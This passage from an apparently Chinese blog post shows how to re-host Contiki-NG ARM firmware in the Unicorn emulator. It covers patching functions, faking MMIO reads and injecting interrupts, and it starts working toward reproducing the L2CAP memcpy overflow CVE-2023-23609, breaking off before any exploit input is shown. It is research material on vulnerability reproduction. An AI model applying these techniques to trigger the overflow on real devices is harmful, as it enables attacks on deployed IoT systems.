+      <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(((</span><span class="kt">int</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="p">)(</span><span class="n">pt</span> <span class="o">*</span><span class="p">,</span> <span class="n">process_event_t</span><span class="p">,</span> <span class="n">process_data_t</span><span class="p">))</span><span class="kr">thread</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">pt</span><span class="p">,</span> <span class="n">ev</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">1</span>
+        <span class="o">||</span> <span class="n">v4</span> <span class="o">==</span> <span class="mi">131</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">exit_process</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">else</span>
+      <span class="p">{</span>
+        <span class="n">p</span><span class="o">-&gt;</span><span class="n">state</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>至此，我们发现这个 firmware 看上去就是不停地执行两个函数。当然如果查看所有调用了 <code>process_start</code> 的地方可以发现还会运行其他函数。</p>
+<h4 id="一些题外话">一些题外话？</h4>
+<h6 id="dma">DMA</h6>
+<p>DMA 是硬件，会维护一个 dma buffer，是外设到内存的高速通道。一般 firmware 程序要使用外设数据，是从 MMIO 里拿来用。有了 DMA 以后不经过 MMIO，DMA 直接改变物理内存，将外设的数据写进内存，存在 dma buffer 中，而 firmware 程序只需要从这个 buffer 中拿就行了。这其中省略了 CPU 的各种映射、读写过程。</p>
+<h6 id="中断">中断</h6>
+<p>中断对于系统来说是非常重要的，一个支持中断的 CPU 会在每条执行结束之后，去看看中断硬件是否产生中断，如果产生了就去中断向量表里找对应中断函数地址。在执行中断函数之前，由<strong>硬件</strong>保存上下文（寄存器等）。执行完中断函数之后，由<strong>硬件</strong>恢复上下文，继续执行。</p>
+<p>考虑这样一个需求，一个 firmware 想要处理接收到的网络包。能想到的做法是：firmware 把网络包的处理函数放在网卡的中断函数中。每当网卡接收到网络包时，它产生中断，并通过 DMA 或者 MMIO 方式将网络包内容发送给程序，CPU 捕获中断跑去执行中断函数，处理网络包，实现需求。这种响应式的处理方法无疑是中断机制下的产物，减少 CPU 空转。</p>
+<p>这样很自然会想到这个问题，这个 Contiki 的 <code>process_thread_tcpip_process</code> 任务，看上去就是去响应、处理网络包。为啥它被放在 main 函数里一遍又一遍执行呢？这将随着本文不断深入地分析代码而揭开谜底。</p>
+<h2 id="re-host">Re-host</h2>
+<p>理解够了接下来才真正开始干活儿，我们接下来的工作重心是用 Unicorn 把这个 firmware 跑起来。</p>
+<h4 id="准备工作">准备工作</h4>
+<h6 id="extract-raw-binary">extract raw binary</h6>
+<p>众所周知，一个 ELF 并不是任何段都是有用的。特别是在嵌入式的场景下，存储空间寸土寸金，把整个 ELF 全部烧进板子属实浪费。在这个场景下，感觉把 .text 和 .data 提出来就足够 Unicorn 去模拟了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">x1do0@ubt2022:~/firmware_fuzz/labs/day6$ arm-none-eabi-objcopy -O binary ./hello-world.elf hello-world.bin
+x1do0@ubt2022:~/firmware_fuzz/labs/day6$ ls -la
+total 812
+drwxrwxr-x 2 x1do0 x1do0   4096 Sep 28 11:29 .
+drwxrwxr-x 5 x1do0 x1do0   4096 Sep 26 18:47 ..
+-rwxrwxr-x 1 x1do0 x1do0 516096 Sep 28 11:29 hello-world.bin
+-rwxrwxr-x 1 x1do0 x1do0 730104 Sep 28 11:26 hello-world.elf
+</code></pre></td></tr></table>
+</div>
+</div><p>可以 xxd 对比看看提取出来的 binary 长什么样：开头就是 <code>.text</code> 段，而 <code>.data</code> 段被放在了 0x00012920 处。这里很自然会想到一个问题，这两个段的相对位置相对于 ELF 来说显然发生了改变。那么代码中访问 <code>.data</code> 时寻址岂不是失效了？前面提到 <code>.data</code> 是在 reset_handler 中拷贝的，而这里一个神奇的地方就在于，拷贝的地址 <code>0x214920</code> 与 <code>.text</code> 段（0x202000开始）之间正好差了 0x00012920，使得在模拟中只要正确定位了代码段，那么就不会出现任何问题。这到底是巧合还是必然？</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ble_l2cap_tx_process</span><span class="p">,</span> <span class="mh">0x214920</span><span class="p">,</span> <span class="mh">0x362u</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><h6 id="arm-cortex-m3-memory-layout">ARM Cortex-M3 memory layout</h6>
+<p>清清楚楚，明明白白：<a href="https://documentation-service.arm.com/static/5ea823e69931941038df1b11?token=" target="_blank" rel="noopener noreffer">memory map</a></p>
+<p>其中 Peripheral 区域就是 MMIO，一般来说我们只需要在 Unicorn 中 map 0 - 0x60000000 和 0xE0000000 以上的区域。</p>
+<h6 id="如何模拟中断">如何模拟中断</h6>
+<p>Unicorn 是基于 QEMU 开发的，但前者将 QEMU 的中断支持完全去掉了，所以我们需要用软件来模拟中断响应的过程。简单来想，当代码模拟执行到要发生中断的位置处时，保存寄存器，跳到对应中断函数，执行完恢复寄存器，跳回中断发生处接着执行即可。</p>
+<p>Unicorn 模拟中断的过程疑似是大有门道，但暂且先抱着能用就行的心态继续下去，不深入研究了。</p>
+<h6 id="如何模拟硬件">如何模拟硬件</h6>
+<p>一个固件上的硬件，比如传感器，收到了数据，它要从 MMIO 寄存器里读。如何模拟 MMIO 寄存器读呢？我们也简单地想，每当读某些地址时，主动 mem_write 一个随机值，模拟硬件数据就好了吧？</p>
+<h6 id="如何跳过某些函数">如何跳过某些函数？</h6>
+<p>在 hook code 的时候发现，有些函数异常烦人，比如 <code>fade</code> 函数中的循环在被 hook 上之后使得整个模拟过程变得究极慢，而显然这并不是一个有什么作用的函数，所以得想个办法在模拟的时候直接将其跳过。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">fade</span><span class="p">(</span><span class="n">leds_mask_t</span> <span class="n">l</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// r5
+</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// r4
+</span><span class="c1"></span>  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [sp+4h] [bp-14h]
+</span><span class="c1"></span>  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">ia</span><span class="p">;</span> <span class="c1">// [sp+4h] [bp-14h]
+</span><span class="c1"></span>
+  <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">800</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">j</span> <span class="o">&gt;</span> <span class="mi">400</span> <span class="p">)</span>
+      <span class="n">v3</span> <span class="o">=</span> <span class="mi">800</span> <span class="o">-</span> <span class="n">j</span><span class="p">;</span>
+    <span class="k">else</span>
+      <span class="n">v3</span> <span class="o">=</span> <span class="n">j</span><span class="p">;</span>
+    <span class="n">leds_on</span><span class="p">(</span><span class="n">l</span><span class="p">);</span>
+    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">v3</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+      <span class="p">;</span>
+    <span class="n">leds_off</span><span class="p">(</span><span class="n">l</span><span class="p">);</span>
+    <span class="k">for</span> <span class="p">(</span> <span class="n">ia</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="mi">400</span> <span class="o">-</span> <span class="n">v3</span> <span class="o">&gt;</span> <span class="n">ia</span><span class="p">;</span> <span class="o">++</span><span class="n">ia</span> <span class="p">)</span>
+      <span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>其实思路也非常简单，在开始模拟之前把它 patch 掉让它提前返回就行了。观察函数体，进去的时候寄存器入栈，下拉 SP，出来的时候上拉 SP 并复原寄存器。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">.text:00210924 ; void __fastcall fade(leds_mask_t l)
+.text:00210924 fade                                    ; CODE XREF: platform_init_stage_two+3C↑p
+.text:00210924                                         ; platform_init_stage_three+20↑p ...
+.text:00210924
+.text:00210924 i               = -0x14
+.text:00210924
+.text:00210924 l = R0                                  ; leds_mask_t
+.text:00210924                 PUSH    {R4-R6,LR}
+.text:00210926                 SUB     SP, SP, #8
+
+...
+
+.text:0021097C                 ADD     SP, SP, #8
+.text:0021097E                 POP     {R4-R6,PC}
+</code></pre></td></tr></table>
+</div>
+</div><p>那么很自然的，我们把 0x210926 处的代码直接修改为 <code>POP {R4-R6,PC}</code> 即可。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="mh">0x210926</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x70\xBD</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># bypass fade, POP {R4-R6,PC}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>解决不了问题，就消灭提出问题的人！</p>
+<h4 id="模拟程序并产生一个-reset-中断">模拟程序，并产生一个 reset 中断</h4>
+<p>我们先模拟执行到 0x210768 处。思路已经十分清晰了，直接上码。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span><span class="lnt">95
+</span><span class="lnt">96
+</span><span class="lnt">97
+</span><span class="lnt">98
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">unicorn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">unicorn.arm_const</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="kn">import</span> <span class="nn">random</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;arm&#39;</span>
+
+<span class="n">REGION_START</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">REGION_SIZE</span> <span class="o">=</span> <span class="mh">0x60000000</span>
+<span class="n">ROM_BASE</span> <span class="o">=</span> <span class="mh">0x202000</span>
+
+<span class="k">def</span> <span class="nf">hook_code</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>        
+    <span class="k">pass</span>
+
+<span class="n">interrupted</span> <span class="o">=</span> <span class="kc">False</span>
+
+<span class="k">def</span> <span class="nf">hook_block</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">interrupted</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[hook block] 0x</span><span class="si">{</span><span class="n">address</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">access</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">user_data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+
+    <span class="c1"># interrupt </span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x203D5A</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">interrupted</span><span class="p">):</span>
+
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Interrupted...&#34;</span><span class="p">)</span>
+        <span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+        <span class="n">interrupted</span> <span class="o">=</span> <span class="kc">True</span>
+
+        <span class="c1"># save registers</span>
+        <span class="n">ptrs</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="k">for</span> <span class="n">reg</span> <span class="ow">in</span> <span class="n">regs</span><span class="p">:</span>
+            <span class="n">ptrs</span><span class="p">[</span><span class="n">reg</span><span class="p">]</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">reg</span><span class="p">)</span>
+        <span class="n">pc</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_PC</span><span class="p">)</span>
+            
+        <span class="c1"># execute functions</span>
+        <span class="n">interrupt_no</span> <span class="o">=</span> <span class="mi">2</span> <span class="c1"># reset</span>
+        <span class="n">interrupt_func</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ROM_BASE</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="p">(</span><span class="n">interrupt_no</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">4</span><span class="p">))</span>
+        <span class="n">mu</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">interrupt_func</span><span class="p">,</span> <span class="mh">0x00210768</span><span class="p">)</span>
+
+        <span class="n">exit</span><span class="p">()</span>
+
+        <span class="c1"># restore</span>
+        <span class="k">for</span> <span class="n">reg</span> <span class="ow">in</span> <span class="n">regs</span><span class="p">:</span>
+            <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">reg</span><span class="p">,</span> <span class="n">ptrs</span><span class="p">[</span><span class="n">reg</span><span class="p">])</span>    <span class="c1"># how to deal with stack?</span>
+        <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">UC_ARM_REG_PC</span><span class="p">,</span> <span class="n">pc</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span>
+
+
+    <span class="k">pass</span>
+    
+
+<span class="k">def</span> <span class="nf">hook_mem_unmapped</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[hook_mem_unmapped] </span><span class="si">{</span><span class="n">access</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">address</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">user_data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+    <span class="k">pass</span>
+
+
+<span class="k">def</span> <span class="nf">hook_mem_read</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
+    <span class="c1"># print(f&#34;[hook_mem_read] {access}, {address:x}, {length}, {value}, {user_data}&#34;)</span>
+    <span class="k">if</span> <span class="n">length</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x4000000</span><span class="p">])</span>   <span class="c1"># to bypass sys_ctrl_init, random_init</span>
+        <span class="c1"># print(f&#34;content: {mu.mem_read(address, 4)}, ready to write random: {r}&#34;)</span>
+        <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
+
+
+<span class="n">regs</span> <span class="o">=</span> <span class="p">[</span><span class="n">UC_ARM_REG_SP</span><span class="p">,</span> <span class="n">UC_ARM_REG_R0</span><span class="p">,</span> <span class="n">UC_ARM_REG_R1</span><span class="p">,</span> <span class="n">UC_ARM_REG_R2</span><span class="p">,</span> <span class="n">UC_ARM_REG_R3</span><span class="p">,</span> <span class="n">UC_ARM_REG_R12</span><span class="p">,</span> <span class="n">UC_ARM_REG_LR</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">mu</span> <span class="o">=</span> <span class="n">Uc</span><span class="p">(</span><span class="n">UC_ARCH_ARM</span><span class="p">,</span> <span class="n">UC_MODE_THUMB</span><span class="p">)</span>
+
+    <span class="c1"># memory regions</span>
+    <span class="n">mu</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">REGION_START</span><span class="p">,</span> <span class="n">REGION_SIZE</span><span class="p">)</span>
+    <span class="n">mu</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="mh">0xe0000000</span><span class="p">,</span> <span class="mh">0x10000000</span><span class="p">)</span> <span class="c1"># NVIC</span>
+
+    <span class="c1"># load ROM</span>
+    <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">ROM_BASE</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;hello-world.bin&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+
+    <span class="c1"># write memory / patch code</span>
+    <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="mh">0x210926</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x70\xBD</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># bypass fade, POP {R4-R6,PC}</span>
+    <span class="c1"># why not push pc, or mov pc,lr</span>
+
+    <span class="c1"># init SP</span>
+    <span class="n">init_sp</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ROM_BASE</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span>
+    <span class="n">reset</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ROM_BASE</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span>
+    <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">UC_ARM_REG_SP</span><span class="p">,</span> <span class="n">init_sp</span><span class="p">)</span>
+    
+    <span class="c1"># hooks</span>
+    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_CODE</span><span class="p">,</span> <span class="n">hook_code</span><span class="p">)</span>
+    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_BLOCK</span><span class="p">,</span> <span class="n">hook_block</span><span class="p">)</span>
+    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_MEM_UNMAPPED</span><span class="p">,</span> <span class="n">hook_mem_unmapped</span><span class="p">)</span>
+    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_MEM_READ</span><span class="p">,</span> <span class="n">hook_mem_read</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="mh">0x40000000</span><span class="p">,</span> <span class="mh">0x60000000</span><span class="p">)</span> <span class="c1"># MMIO read</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;reset:</span><span class="si">{</span><span class="n">reset</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+
+    <span class="n">mu</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">reset</span><span class="p">,</span> <span class="mh">0x00210768</span><span class="p">)</span>
+
+<span class="n">main</span><span class="p">()</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>做几点说明：</p>
+<ol>
+<li>
+<p>前面提到 ARM Boot 的时候从 0 地址处读 SP 和 reset_handler，那是真正的硬件处理流程。软件模拟时，直接把 raw 加载到原本的地址处，至于 SP 和 reset_handler 直接从这个地址处读就行了。</p>
+</li>
+<li>
+<p>hook_code 是比较好的调试手段，通过打印信息可以看到模拟过程。</p>
+</li>
+<li>
+<p>由于有一部分代码会循环等待硬件的值，所以要么把那部分代码 patch 掉，要么 hook_mem_read 来改变 MMIO（相当于从硬件输入值）。</p>
+</li>
+<li>
+<p>中断在 hook_block 中引入。由于模拟的是 reset，为了避免一直循环执行我们只引入一次中断。所以整个想要模拟的过程是这样的：boot -&gt; reset_handler -&gt; main -&gt; 中断 -&gt; reset_handler -&gt; main -&gt; 模拟结束 exit。可以利用 hook_code 打印地址信息看看模拟的是不是这个过程。</p>
+</li>
+</ol>
+<h4 id="触发更多中断复现-cve-2023-23609">触发更多中断，复现 CVE-2023-23609</h4>
+<p>下面我们来做点更有意思的事情：模拟更多的中断来执行到 <a href="https://github.com/contiki-ng/contiki-ng/security/advisories/GHSA-qr4q-6h3m-h3g7" target="_blank" rel="noopener noreffer">CVE-2023-23609</a> 的漏洞代码，并构造中断数据复现漏洞。可以看到漏洞 patch 出现在 <code>input_l2cap_frame_flow_channel</code> 中，大概是缺少一个长度检测，导致紧接着的 memcpy 出现越界。查看 binary 中这个漏洞函数发现确实没有被 patch。</p>
+<h6 id="如何走到漏洞函数">如何走到漏洞函数</h6>
+<p>大概猜测这是一个网络包处理函数，所以我们得进一步分析网卡相关函数。中断表中的 <code>pka_isr</code> 和 <code>cc2538_rf_rx_tx_isr</code> 看上去相当相关。</p>
+<p><code>cc2538_rf_rx_tx_isr</code> 看上去是 poll 一个进程然后修改寄存器。这个进程的入口点在 <code>process_thread_cc2538_rf_process</code>，这个函数看上去就是个收包函数，接收到硬件传来的包以后，经过一系列的校验并调用 <code>input</code> 函数，而 <code>input</code> 就能触发漏洞函数。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">cc2538_rf_rx_tx_isr</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">poll_mode</span> <span class="p">)</span>
+    <span class="n">process_poll</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cc2538_rf_process</span><span class="p">);</span>
+  <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x40088834</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>好，所以接下来我们尝试触发中断函数 <code>cc2538_rf_rx_tx_isr</code>，中断号 158. 注入中断的代码基本可以照搬上部分，很显然中断恢复<a href="https://developer.arm.com/documentation/ddi0403/d/System-Level-Architecture/System-Level-Programmers--Model/ARMv7-M-exception-model/Exception-entry-behavior" target="_blank" rel="noopener noreffer">细节</a>很多，远远比这段代码简单，但是目前暂时能用就行。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
